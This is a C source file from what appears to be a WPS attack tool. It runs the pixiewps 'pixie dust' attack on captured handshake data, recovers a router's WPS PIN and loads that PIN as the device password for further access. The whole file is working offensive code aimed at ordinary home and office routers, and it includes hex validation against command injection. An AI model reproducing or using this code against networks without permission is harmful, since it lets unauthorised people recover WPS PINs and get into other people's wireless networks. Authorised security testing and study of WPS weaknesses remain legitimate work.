#include <sys/types.h>
#undef _POSIX_C_SOURCE
#define _POSIX_C_SOURCE 200809L
#include <time.h>
#include <errno.h>

static int msleep(long millisecs) {
        struct timespec req, rem;
        req.tv_sec = millisecs / 1000;
        req.tv_nsec = (millisecs % 1000) * 1000 * 1000;
        int ret;
        while((ret = nanosleep(&req, &rem)) == -1 && errno == EINTR) req = rem;
        return ret;
}

#include "pixie.h"
#include "globule.h"
#include "send.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

struct pixie pixie = {0};

/* Validates that a string contains only hexadecimal characters.
 * Returns 1 if valid, 0 if invalid or NULL.
 * This prevents command injection via shell metacharacters. */
static int is_valid_hex_string(const char *str) {
	if (!str) return 0;
	while (*str) {
		if (!isxdigit((unsigned char)*str)) return 0;
		str++;
	}
	return 1;
}

void pixie_format(const unsigned char *in, unsigned len, char *outbuf) {
	unsigned i;
	char *out = outbuf;
	/* Each byte converts to 2 hex chars, so buffer needs len*2+1 bytes */
	for(i = 0; i < len; i++, out+=2) {
		snprintf(out, 3, "%02x", in[i]);
	}
	if(i) *out = 0;
}

#define PIXIE_SUCCESS "[+] WPS pin:"
static int pixie_run(char *pixiecmd, char *pinbuf, size_t *pinlen) {
	int ret = 0;
	FILE *pr = popen(pixiecmd, "r");
	if(pr) {
		char buf[1024], *p;
		while(fgets(buf, sizeof buf, pr)) {
			printf("%s", buf);
			if(ret) continue;
			p = buf;
			while(isspace(*p))++p;
			if(!strncmp(p, PIXIE_SUCCESS, sizeof(PIXIE_SUCCESS)-1)) {
				ret = 1;
				char *pin = p + sizeof(PIXIE_SUCCESS)-1;
				while(isspace(*pin))++pin;
				if(!strncmp(pin, "<empty>", 7)) {
					*pinlen = 0;
					*pinbuf = 0;
				} else {
					char *q = strchr(pin, '\n');
					if(q) *q = 0;
					else {
						fprintf(stderr, "oops1\n");
						ret = 0;
					}
					size_t pl = strlen(pin);
					if(pl < *pinlen) {
						memcpy(pinbuf, pin, pl+1);
						*pinlen = pl;
					} else {
						fprintf(stderr, "oops2\n");
						ret = 0;
					}
				}
			}
		}
		pclose(pr);
	}
	return ret;
}

#include <pthread.h>

static struct pixie_thread_data {
	char cmd[4096];
	char pinbuf[64];
	size_t pinlen;
} ptd;
static volatile int thread_done;
static int timeout_hit;
static pthread_mutex_t pixie_mutex = PTHREAD_MUTEX_INITIALIZER;

static void* pixie_thread(void *data) {
	unsigned long ret = pixie_run(ptd.cmd, ptd.pinbuf, &ptd.pinlen);
	pthread_mutex_lock(&pixie_mutex);
	thread_done = 1;
	pthread_mutex_unlock(&pixie_mutex);
	return (void*)ret;
}
static int pixie_run_thread(void *ptr) {
	/* to prevent from race conditions with 2 threads accessing stdout */
	cprintf_mute();

	pthread_t pt;
	if(pthread_create(&pt, 0, pixie_thread, ptr) != 0) {
		cprintf(INFO, "[-] error creating pixie thread\n");
		return pixie_run(ptd.cmd, ptd.pinbuf, &ptd.pinlen);
	}
	unsigned long long us_passed = 0,
	timeout_usec = get_rx_timeout() * 1000000LL;
	int done = 0;
	while(!done) {
		pthread_mutex_lock(&pixie_mutex);
		done = thread_done;
		pthread_mutex_unlock(&pixie_mutex);
		if(done) break;

		us_passed += 2000;
		pthread_mutex_lock(&pixie_mutex);
		if(!timeout_hit && (us_passed >= timeout_usec)) {
			timeout_hit = 1;
			pthread_mutex_unlock(&pixie_mutex);
			send_wsc_nack(); /* sending silent nack */
		} else {
			pthread_mutex_unlock(&pixie_mutex);
		}
		msleep(2);
	}
	void *thread_ret;
	pthread_join(pt, &thread_ret);
	cprintf_unmute();
	return (unsigned long)thread_ret;
}

extern void update_wpc_from_pin(void);

void pixie_attack(void) {
	struct wps_data *wps = get_wps();
	struct pixie *p = &pixie;
	int dh_small = get_dh_small();

	if(p->do_pixie) {
		/* Validate all hex string inputs to prevent command injection */
		if (!is_valid_hex_string(p->pke) ||
		    !is_valid_hex_string(p->ehash1) ||
		    !is_valid_hex_string(p->ehash2) ||
		    !is_valid_hex_string(p->authkey) ||
		    !is_valid_hex_string(p->enonce) ||
		    (!dh_small && !is_valid_hex_string(p->pkr))) {
			cprintf(CRITICAL, "[-] Invalid pixie data detected, aborting\n");
			send_wsc_nack();
			exit(1);
		}

		char uptime_str[64];
		snprintf(uptime_str, sizeof(uptime_str), "-u %llu ",
			(unsigned long long) globule->uptime);
		snprintf(ptd.cmd, sizeof (ptd.cmd),
		"pixiewps %s-e %s -s %s -z %s -a %s -n %s %s %s",
		(p->use_uptime ? uptime_str : ""),
		p->pke, p->ehash1, p->ehash2, p->authkey, p->enonce,
		dh_small ? "-S" : "-r" , dh_small ? "" : p->pkr);
		printf("executing %s\n", ptd.cmd);
		ptd.pinlen = 64;
		ptd.pinbuf[0] = 0;
		if(pixie_run_thread(&ptd)) {
			cprintf(INFO, "[+] Pixiewps: success: setting pin to %s\n", ptd.pinbuf);
			set_pin(ptd.pinbuf);
			if(timeout_hit) {
				cprintf(VERBOSE, "[+] Pixiewps timeout hit, sent WSC NACK\n");
				cprintf(INFO, "[+] Pixiewps timeout, exiting. Send pin with -p\n");
				update_wpc_from_pin();
				exit(0);
			}
			free(wps->dev_password);
			wps->dev_password = malloc(ptd.pinlen+1);
			memcpy(wps->dev_password, ptd.pinbuf, ptd.pinlen+1);
			wps->dev_password_len = ptd.pinlen;
		} else {
			cprintf(INFO, "[-] Pixiewps fail, sending WPS NACK\n");
			send_wsc_nack();
			exit(1);
		}
	}
	PIXIE_FREE(authkey);
	PIXIE_FREE(pkr);
	PIXIE_FREE(pke);
	PIXIE_FREE(enonce);
	PIXIE_FREE(ehash1);
	PIXIE_FREE(ehash2);
}
